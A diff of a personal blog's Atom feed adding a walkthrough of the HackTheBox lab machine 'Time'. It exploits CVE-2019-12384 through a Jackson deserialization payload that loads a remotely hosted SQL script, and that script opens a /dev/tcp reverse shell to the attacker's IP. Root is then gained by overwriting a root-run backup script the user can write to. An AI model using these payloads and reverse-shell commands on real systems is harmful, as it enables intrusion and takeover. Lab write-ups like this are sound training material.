@@ -1,23 +1,161 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-03-30T07:16:31-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">#keepLearning</title><subtitle>An amazing website.</subtitle><author><name>Philipp Menner</name></author><entry><title type="html">Hackthebox - RopMe</title><link href="http://localhost:4000/challenges/RopMe/" rel="alternate" type="text/html" title="Hackthebox - RopMe" /><published>2020-09-19T02:14:00-04:00</published><updated>2020-09-19T02:14:00-04:00</updated><id>http://localhost:4000/challenges/RopMe</id><content type="html" xml:base="http://localhost:4000/challenges/RopMe/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-04-03T10:35:16-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">#keepLearning</title><subtitle>An amazing website.</subtitle><author><name>Philipp Menner</name></author><entry><title type="html">HackTheBox - Time</title><link href="http://localhost:4000/boxes/Time/" rel="alternate" type="text/html" title="HackTheBox - Time" /><published>2021-04-02T21:33:36-04:00</published><updated>2021-04-02T21:33:36-04:00</updated><id>http://localhost:4000/boxes/Time</id><content type="html" xml:base="http://localhost:4000/boxes/Time/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;This is a brief walkthrough for the box &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Time&lt;/code&gt; from &lt;a href=&quot;https://www.hackthebox.eu&quot;&gt;HackTheBox&lt;/a&gt; with some remarks on &lt;a href=&quot;#permissions&quot;&gt;file/directory permissions&lt;/a&gt; in the appendix.&lt;/p&gt;
+&lt;h1 id=&quot;getting-a-shell-on-the-box-user-flag&quot;&gt;Getting a shell on the box, user flag&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/time/web_page.png&quot; alt=&quot;web&quot; height=&quot;720px&quot; width=&quot;360px&quot; class=&quot;align-right&quot; /&gt;
+As only &lt;a href=&quot;#nmap&quot;&gt;port 22 and 80 are open&lt;/a&gt; we take a look at the website and find an online beautifier and validator:&lt;/p&gt;
+
+&lt;p&gt;Clicking around will soon reveal an error message. For example, entering a single quote and selecting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Validate (beta!)&lt;/code&gt; triggers an error message which contains &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.fasterxml.jackson.core.JsonParseException&lt;/code&gt;. Researching this error for a bit leads us to &lt;a href=&quot;https://github.com/jas502n/CVE-2019-12384&quot;&gt;CVE-2019-12384&lt;/a&gt; and following the steps outlined on the github page allows us to execute arbitrary code to get a shell on the box.&lt;br /&gt;
+First we need to create the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.sql&lt;/code&gt; file which we will then host via the python http server. In this sql file, we simply need to change the argument of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SHELLEXEC()&lt;/code&gt; in the last line to what we wish to run:&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sql&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ALIAS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SHELLEXEC&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellexec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;util&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Scanner&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;util&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Scanner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;useDelimiter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasNext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;CALL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SHELLEXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sh -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.6/1234 0&amp;gt;&amp;amp;1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;To retrieve and execute this file we then need to slightly adjust the serialized payload that’s passed to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.rb&lt;/code&gt; file in the github page:&lt;/p&gt;
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;url&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.6:8000/reverse.sql'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Pasting it into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Validate (beta!)&lt;/code&gt; field after setting up a local http server using python and a netcat listener:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server
+&lt;span class=&quot;go&quot;&gt;Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.214 - - [09/Mar/2021 10:58:53] &quot;GET /reverse.sql HTTP/1.1&quot; 200 -
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt; $&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 1234
+&lt;span class=&quot;go&quot;&gt; Ncat: Version 7.91 ( https://nmap.org/ncat )
+ Ncat: Listening on :::1234
+ Ncat: Listening on 0.0.0.0:1234
+ Ncat: Connection from 10.10.10.214.
+ Ncat: Connection from 10.10.10.214:55502.
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt; sh: 0: can't access tty;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;job control turned off
+&lt;span class=&quot;gp&quot;&gt; $&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt; css
+ fonts
+ images
+ index.php
+ js
+ vendor
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt; $&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt; pericles
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt; $&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/pe&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt; $&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt; snap
+ user.txt
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;we notice command execution and get a shell back as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pericles&lt;/code&gt;.
+We can now collect the user flag.&lt;/p&gt;
+
+&lt;h1 id=&quot;root&quot;&gt;Root&lt;/h1&gt;
+&lt;p&gt;First I upgrade to a ssh shell by echoing my public ssh key into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.ssh/authorized_keys&lt;/code&gt;. As &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; requires a password we do not have and the home directory of pericles is pretty much empty I upload &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot;&gt;pspy&lt;/a&gt; to see if any interesting processes are running, and indeed there are:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;pericles@time:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;[sudo] password for pericles:
+Sorry, try again.
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;pericles@time:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;./pspy64
+&lt;span class=&quot;go&quot;&gt;[snip]
+CMD: UID=0    PID=15551  | zip -r website.bak.zip /var/www/html
+CMD: UID=0    PID=15528  | mv website.bak.zip /root/backup.zip
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The user with UID 0 (root) zips &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/website.bak.zip&lt;/code&gt; and moves it into the root folder, which is quickly confirmed by:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;pericles@time:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; / | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;website&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;website.bak.zip
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;I thought for a few minutes if there’s a path vulnerability or anything I could put into the html folder to exploit but as the zip file doesn’t seem to get extracted that shouldn’t be possible. I then noticed another command thats run by root:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;15548  | /bin/bash /usr/bin/timer_backup.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;I started by looking at the file’s permissions and to my surprise the file is owned by our user - which is rather unusual, because we cannot create files in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin&lt;/code&gt; - giving us full access to the file. More on that &lt;a href=&quot;#permissions&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;-rwxr-xr-x 1 root     root     14720 Apr 21  2017 time
+-rwxr-xr-x 1 root     root     43080 Apr 22  2020 timedatectl
+-rwxr-xr-x 1 root     root     43800 Sep  5  2019 timeout
+-rwxrw-rw- 1 pericles pericles    88 Mar  9 16:15 timer_backup.sh
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;For simplicity I simply collected the root flag via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; but we really have all options here, as the file is executed as root:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/bin/timer_backup.sh
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;/bin/bash
+&lt;span class=&quot;go&quot;&gt;zip -r website.bak.zip /var/www/html &amp;amp;&amp;amp; mv website.bak.zip /root/backup.zip
+
+[replaced by]
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/bin/timer_backup.sh
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;/bin/bash
+&lt;span class=&quot;gp&quot;&gt;cat /root/root.txt &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;/tmp/.flag
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;pericles@time:/tmp$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .flag
+&lt;span class=&quot;go&quot;&gt;258535e5056435406f3d85114a2819b8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;appendix&quot;&gt;Appendix&lt;/h1&gt;
+&lt;h2 id=&quot;-about-file-and-directory-permissions&quot;&gt;&lt;a name=&quot;permissions&quot;&gt;&lt;/a&gt; About file and directory permissions&lt;/h2&gt;
+&lt;p&gt;Interestingly enough &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;timer_backup.sh&lt;/code&gt; is owned by user and group &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pericles&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;-rwxrw-rw- 1 pericles pericles    88 Mar  9 16:15 timer_backup.sh
+
+So reading the permissions from left to right: rwx rw- rw- 
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;First three bits -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;owner 		-&amp;gt; &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;, write and execute
+&lt;span class=&quot;gp&quot;&gt; Next three bits -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;group 		-&amp;gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;and write
+&lt;span class=&quot;gp&quot;&gt; Last three bits -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;everybody &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; 	-&amp;gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;and write
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Interestingly enough, because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/&lt;/code&gt; is not a directory we are allowed to create files in:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;pericles@time:/usr/bin$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch &lt;/span&gt;file
+&lt;span class=&quot;go&quot;&gt;touch: cannot touch 'file': Permission denied
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;So probably the file was created here by root and he then changed the ownership and group to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pericles&lt;/code&gt;. &lt;br /&gt;
+As we have the write bit set on the &lt;em&gt;file&lt;/em&gt; but not on its parent directory we can therefore make changes to the content of the file but not to the file itself:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;pericles@time:/usr$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 96
+drwxr-xr-x   2 root root 36864 Feb  9 14:42 bin
+[snip]
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;pericles@time:/usr$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;As we neither are root nor in the root group, the execute bit - which allows us to enter the directory - and the read bit - which allows us to list the contents of the directory - are set for us. Thus we are not allowed to create new files nor remove existing ones even if these files are owned by us (which allows us to set file permissions however we like) because that would change the content of the directory and for this we need the write bit of the parent directory to be enabled - which can be done using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod o+w /usr/bin&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;pericles@time:/usr/bin$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;timer_backup.sh
+&lt;span class=&quot;go&quot;&gt;rm: cannot remove 'timer_backup.sh': Permission denied
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;root@time:/#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;o+w /usr/bin/  &lt;span class=&quot;c&quot;&gt;# write bit for users who aren't the owner/in the group of the file&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;chmod o+w /usr/bin/		
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;pericles@time:/usr/bin$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /usr/
+&lt;span class=&quot;go&quot;&gt;total 104
+drwxr-xr-x  14 root root  4096 Apr 23  2020 .
+drwxr-xr-x  20 root root  4096 Apr  3 10:10 ..
+drwxr-xrwx   2 root root 36864 Apr  3 10:09 bin
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;pericles@time:/usr/bin$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;timer_backup.sh
+&lt;span class=&quot;gp&quot;&gt;pericles@time:/usr/bin$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;-nmap-scan&quot;&gt;&lt;a name=&quot;nmap&quot;&gt;&lt;/a&gt; Nmap scan&lt;/h2&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 10.10.10.214
+&lt;span class=&quot;go&quot;&gt;Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-01 04:44 EDT
+Nmap scan report for 10.10.10.214
+Host is up (0.035s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 18.68 seconds
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Philipp Menner</name></author><category term="boxes" /><category term="linux" /><summary type="html">Write-up of the box Time from Hack The Box</summary></entry><entry><title type="html">Hackthebox - RopMe</title><link href="http://localhost:4000/challenges/RopMe/" rel="alternate" type="text/html" title="Hackthebox - RopMe" /><published>2020-09-19T02:14:00-04:00</published><updated>2020-09-19T02:14:00-04:00</updated><id>http://localhost:4000/challenges/RopMe</id><content type="html" xml:base="http://localhost:4000/challenges/RopMe/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
 &lt;p class=&quot;text-justify&quot;&gt;Running the binary just asks us to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROP me outside, how 'about dah?&lt;/code&gt; which hints at &lt;ins&gt;r&lt;/ins&gt;eturn &lt;ins&gt;o&lt;/ins&gt;riented &lt;ins&gt;p&lt;/ins&gt;rogramming (ROP) - redirecting code execution by abusing a buffer overflow vulnerability. And indeed, when hammering the input with a lot of characters we get a seg fault:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~$ ./ropme
-ROP me outside, how 'about dah?
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;./ropme
+&lt;span class=&quot;go&quot;&gt;ROP me outside, how 'about dah?
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
